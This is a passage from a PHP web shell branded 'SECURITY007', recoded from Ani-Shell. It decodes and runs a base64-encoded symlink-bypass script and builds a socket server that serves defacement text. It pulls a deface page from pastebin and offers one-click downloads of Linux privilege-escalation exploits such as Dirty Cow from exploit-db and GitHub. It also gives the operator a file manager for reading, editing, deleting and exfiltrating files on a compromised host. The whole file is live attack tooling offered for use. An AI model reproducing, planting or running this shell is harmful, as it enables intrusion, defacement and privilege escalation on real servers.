0ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9dHIudHh0L2hvbWUvJXMlcyB0YXJnZXQ9X2JsYW5rID4lczwvYT48L3RkPiIlKGNvdW50ZXIsZnVzcixmdXNyLHBhdGgsZnNpdGUpKQoJCQljb3VudGVyPWNvdW50ZXIrMQ==";
		$dec = base64_decode($py);
		mkdir('bypass_symlink_script',0777);
		$hasil = fopen('bypass_symlink_script/symlinkBypass.py','w');
		fwrite($hasil,$dec);
		echo "<br><br><center>Done !! >>> <a href=?dir=".$dir."/bypass_symlink_script \>Script</a> <<<</center>";
		echo "<br><br><center>Done !! >>> <a href=".$full."/bypass_symlink_script/trjnx \>GO TO HERE</a> <<<</center>";
		$result = exec_all('cd bypass_symlink_script && python symlinkBypass.py');
		
	}
}elseif(isset($_GET['toket'])){
	echo "
	<h1><code>Create Socket Server Script</code></h1><br>
	<form method='POST'>
	Port:<br>
	<input type='text' value='3121' name='port' size='20' >
	<br><br>
	Deface Text:<br>
	<input type='text' value='Hacked By Security007' name='katmut' size='20' ><br><br>
	<input class='own' name='submit' type='Submit' value='fuck It!!' style='border-color:silver'/>
	</form>
	</center>";
	if ($_POST['submit']){
		$tok = "#!/usr/bin/python

from socket import *

serverSocket = socket(AF_INET, SOCK_STREAM)

serverSocket.bind(('', ".$_POST['port'].")) 
serverSocket.listen(1)
while True:
    print ('')
    connectionSocket, addr = serverSocket.accept()
    try:
        message = connectionSocket.recv(1024)
        outputdata = message.read()
        f.close()
       
        connectionSocket.send('HTTP/1.0 200 OK\r\n\r\n')
        connectionSocket.send('Content-type:text/html\r\n\r\n')
        for i in range(0, len(outputdata)):
            connectionSocket.send(outputdata[i])
        connectionSocket.close()
    except:

        connectionSocket.send('<center><h1>".$_POST['katmut']."<hr>'.encode('utf-8'))
        
        connectionSocket.close()
serverSocket.close()
print ('Done!!') ";
		
		mkdir('toket',0777);
		$hasil = fopen('toket/socket.py','w');
		fwrite($hasil,$tok);
		echo "<br><br><center>Saya sedang bekerja sekarang, buka dan lihat server pada port ".$_POST['port']."</center>";
		echo exec_all("python /toket/socket.py");
	}
}elseif(isset($_GET['depes'])) {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function priv($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('sec007.php')) {
		echo "<center><font color=silver><a href='$full/sec007.php' target='_blank'>-> Done <-</a></font></center>";
	} else {
		if(priv("https://pastebin.com/raw/9nrrUd4Y","sec007.php")) {
			echo "<center><font color=silver><a href='$full/sec007.php' target='_blank'>-> Done <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat priv deface</font></center>";
		}
	}
}elseif(isset($_GET['localroot'])) {
	echo "<center><hr><font color=00ff00 size=5px ><marquee><code>LINUX PRIVILAGE ESCALATION EXPLOIT</marquee></code></font><center><hr><br>";
	echo "<center><form method=POST ><table ><tr><td>";
	echo "<code>Dirty Cow (2016) =======================> <input type=submit name=dirty value=Download ><br>";
	echo "<code>DynoRoot (6.x/7.x)(2018) ===============> <input type=submit name=dyno value=Download ><br>";
	echo "<code>GNU Beep 1.3 (2018) ====================> <input type=submit name=beep value=Download ><br>";
	echo "<code>Glibc getcwd() local privilage (2018) ==> <input type=submit name=glib value=Download ><br>";
	echo "<code>Ubuntu 4.4.0-62-generic (2017) =========> <input type=submit name=ubuntu value=Download ><br>";
	echo "<code>Kernel 4.3.3 Ubuntu (2015) =============> <input type=submit name=2015 value=Download ><br>";
	echo "<code>Kernel 3.13.0 < 3.19 Ubuntu (2014) =====> <input type=submit name=2014 value=Download ><br>";
	echo "</code></td><tr></table></center></form>";
	if ($_POST['dirty']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://githubusercontent.com/FireFart/dirtycow/master/dirty.c --output dirty.c");
		if(file_exists('dirty.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as dirty.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['dyno']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://exploit-db.com/raw/44652 --output dyno.c");
		if(file_exists('dyno.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as dyno.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['beep']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://exploit-db.com/raw/44452 --output beep.py");
		if(file_exists('beep.py')) {
		echo "<center><font color=lime>Download localroot success file renamed as beep.py</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['glib']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://exploit-db.com/raw/43775 --output glib.c");
		if(file_exists('glib.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as glib.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['ubuntu']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-6074/poc.c --output ubuntu.c");
		if(file_exists('ubuntu.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as ubuntu.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['2015']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://exploit-db.com/raw/39166 --output 2015.c");
		if(file_exists('2015.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as 2015.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	}
	if ($_POST['2014']){
		echo "<p align=left ><pre>";
		echo exec_all("curl https://exploit-db.com/raw/37292 --output 2014.c");
		if(file_exists('2014.c')) {
		echo "<center><font color=lime>Download localroot success file renamed as 2014.c</font></center>";
	} else {
		echo "Failed to download localroot";
		}
	echo "</pre></p>";
	}
}
//open file

else if(isset($_GET['open']))
{
    ?>
	</center>
        <form method="POST" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="cmd" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="110" class="cmd"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            $fd = fopen($_GET['open']);
	    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>";
	    else {
            while(!feof())
            {
                echo htmlspecialchars(fgets($fd));
            }
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" class="own" id="spacing"/>
        </form>
    <?php
}

//Rename

else if(isset($_GET['rename']))
{
    if(isset($_GET['to']) && isset($_GET['rename']))
    {
        if(rename($_GET['rename'],$_GET['to']) == FALSE)
        {
            ?>
            <big><p class="blink">Cant rename the file specified! Please check the file-name , Permissions and try again!</p></big>
            <?php
        }
        else
        {
            ?>
            <big><p class="blink">File Renamed , Return <a href="<?php echo $self;?>">Here</a></p></big>
            <?php
        }
    }
    else
    {
?>
    <form method="GET" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="rename" /></td>
            </tr>
            <tr>
                <td>To </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="to" /></td> 
            </tr>
        </table>
        <input type="Submit" value="Rename :D" class="own" style="margin-left: 160px;padding: 5px;"/>
        </form>   
    <?php
    }
}
// No request made
// Display home page

else
{
    echo "    </center>";
    $dir = getcwd();
    if(isset($_GET['dir']))
    {
        $dir = $_GET['dir'];
    }
    ?>
    <table id="margins">
    <tr>
        <form method="GET" action="<?php echo $self;?>">
        <td width="100">Move To</td><td width="410"><input name="dir" class="cmd" id="mainInput" value="<?php echo $dir;?>"/></td>
        <td><input type="submit" value="Go" class="own" /></td>
        </form>
    </tr>
    </table>
    
    <table id="margins" class="files">
    <tr>
        <th class="header" width="500px">Name</th>
        <th width="100px" class="header">Size</th>
        <th width="100px" class="header">Permissions</th>
        <th width="100px" class="header">Delete</th>
        <th width="100px" class="header">Rename</th>
	<th width="100px" class="header">Zip</th>
    </tr>
    <?php
    
    if(isset($_GET['delete']))
    {
        if(unlink(($_GET['delete'])) == TRUE)
        {
            echo "<p id='margins' class='alert_green'>Berhasil dihapus</p>";
        }else{
			echo "<p id='margins' class='alert_red'>Could Not Delete the FILE Specified</p>";
    }
	}

    else if(isset($_GET['delete_dir']))
    {
        if(rmdir(($_GET['delete'])) == TRUE)
        {
            echo "<p id='margins' class='alert_green'>Berhasil dihapus</p>";
        }else{
		echo "<p id='margins' class='alert_red'>Could Not Delete the DIRECTORY Specified</p>";}
    }

    if(is_dir($dir))
    {
        $handle = opendir($dir);
        if($handle != FALSE)
        {
        if($dir[(strlen($dir)-1)] != $SEPARATOR){$dir = $dir.$SEPARATOR;}
        while (($file = readdir($handle)) != false) {
                if ($file != "." && $file != "..")
        	{
		
		$color = 'red';
		if(is_readable($dir.$file))
		{
			$color = 'yellow';
		}
		if(is_writable($dir.$file))
		{
			$color = 'silver';
		}
		
                if(is_dir($dir.$file))
                {
                    ?>
                    <tr>
                    <td class='dir'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'><b>/<?php echo $file ?></b></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(dirSize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete_dir=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
		    <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                <?php
                }
                //Its a file 
                else
                {
                    ?>
                    <tr>
                    <td class='file'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(filesize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
	            <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                    <?php
                }
            }
        }
        closedir($handle);
        }
    }
    else
    {
        echo "<p class='alert_red' id='margins'>Permission Denied</p>";
    }
    ?>
    </table>
    <?php
  
}
//------------------------------------------------------------------------------------------------
?>

<?php
}
// End Shell
//-------------------------------------------------------------------------------------------------
?>
  <div class="clearfooter"></div>
</div>

<div class="end" id='footer' style="margin-top: 20px;">
<p align="center"><font color="blue"><b>SECURITY007 WEBSHELL RECODED FROM ANI-SHELL</b><br />
<b>Email</b></font><font color="silver"> : defacementsec007@gmail.com</font> <b><font color="blue">facebook</b></font><font color="silver"> : https://facebook.com/defacement.sec<br>
</font><b><font color="blue">Special thank's to</b></font><font color="silver"> : ProblemCyberTeam,IndoXploit,Andela-webshell,Ani-Shell,Indonesian People<br />
</font></p>
</div>

</body>
</html>
